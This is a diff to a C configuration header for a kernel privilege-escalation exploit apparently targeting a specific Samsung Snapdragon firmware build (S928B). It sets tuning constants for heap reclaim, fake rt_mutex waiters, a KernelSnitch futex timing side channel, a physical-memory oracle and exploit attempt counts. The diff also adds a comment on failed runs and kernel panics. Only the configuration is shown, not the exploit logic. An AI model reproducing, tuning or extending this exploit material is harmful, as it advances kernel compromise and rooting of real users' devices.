@@ -4,7 +4,6 @@
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define BUILD_VARIANT_LABEL "e3q-S928BXXS5CZC1-app-physical-p0-oracle"
 #define APP_PHYS_P0_ORACLE 1
-#define APP_REQUIRE_FRESH_P0_SESSION 1
 #else
 #define BUILD_VARIANT_LABEL "e3q-S928BXXS5CZC1-root-umh"
 #endif
@@ -26,27 +25,19 @@
 // sibling Qcom pa3q/q7q profiles use the same 0xa8000000 load base.
 #define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
 #define SKB_DATA_DELTA (-0x1000LL)
+// mm_struct is 0x400 bytes in an order-3 slab on this kernel (BTF-verified).
 #define MM_STRUCT_SZ 0x400
 #define MM_ORDER 3
 #define KERNELSNITCH_VERBOSE 1
 
-#define APP_SLIDE_RECLAIM_SENDS 192
-#define APP_SLIDE_RECLAIM_SNDBUF 16777216
-#define APP_MM_LATE_DRAIN_TRIGGERS 2
-#define APP_DEFER_FINAL_DRAIN_REAP 1
-#define APP_DEFER_ALL_DRAIN_REAPS 1
-#define APP_QUIET_RECLAIM_WINDOW 1
-#define APP_SLIDE_MIN_OBJECT_INDEX 27
-#define APP_SLIDE_MAX_OBJECT_INDEX 30
-#define APP_FOPS_MIN_OBJECT_INDEX 24
-#define APP_FOPS_PSELECT_DELAY_USEC 50000
-#define SLIDE_SYNC_PSELECT_SYSCALL 1
-#define SLIDE_GUARD_PSELECT_SYSCALL 1
-#define SLIDE_PSELECT_READY_TIMEOUT_USEC 20000
-#define SLIDE_PSELECT_RECHECK_TIMEOUT_USEC 20000
-#define SLIDE_PSELECT_WCHAN_CONFIRMATIONS 3
-#define APP_ACCEPT_SCHED_TRIGGER 1
-#define APP_PSELECT_POST_GUARD_AGE_CHECK 1
+// NOTE: the Exynos-style "fresh p0 session" knobs (reclaim gating, drain
+// deferral, wchan pselect sync, sched trigger) were tried in runs 3-6 and
+// made things worse on this Snapdragon: zero pipe-gate hits across three
+// boots and armed-state timeout kills that left stale PI waiters pointing
+// at freed pages (run 6 panic: rt_mutex_adjust_prio_chain+0x4a4 reading
+// owner=9 from a reused page during the next attempt's KernelSnitch PI
+// futex scan). This profile therefore follows the minimal DZF2/pa3q Qcom
+// baseline instead.
 
 #define SLIDE_FAKE_WAITER_PRIO 0
 #define SLIDE_WAITER_WAKE_STATE 0
@@ -70,17 +61,7 @@
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define ROUTE_WAIT_SECONDS 8
 #define PSELECT_ENTER_DELAY_USEC 50000
-#define SLIDE_PSELECT_TIMEOUT_NSEC 500000000L
-#define APP_PSELECT_TRIGGER_MAX_AGE_USEC 150000
-#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 8
-#define APP_SLIDE_FRESH_PAGE_ATTEMPTS 8
-#define APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES 16
-#define APP_FOPS_FRESH_PAGE_ATTEMPTS 8
-#define APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES 16
-#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 8
-#define DEFAULT_EXPLOIT_ATTEMPTS 1
-#define DEFAULT_ATTEMPT_TIMEOUT_SEC 2200
-#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 1200
+#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
 #define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
 #define SLIDE_KSNITCH_AVERAGE 8
@@ -94,7 +75,6 @@
 #define P0_ORACLE_PROBE_SLOT 1
 #define P0_ORACLE_GATE_RESTORE_SLOT 2
 #define P0_ORACLE_PROBE_RESTORE_SLOT 3
-#define P0_ORACLE_PRODUCTION_SLOT 4
 #define P0_ORACLE_GATE_PAGE_OFF 0x0e80
 #define P0_ORACLE_GATE_OBJECT_INDEX 1
 // phys probe = 0xa8000000 + 0x1f0000 = 0xa9f00000, inside the running
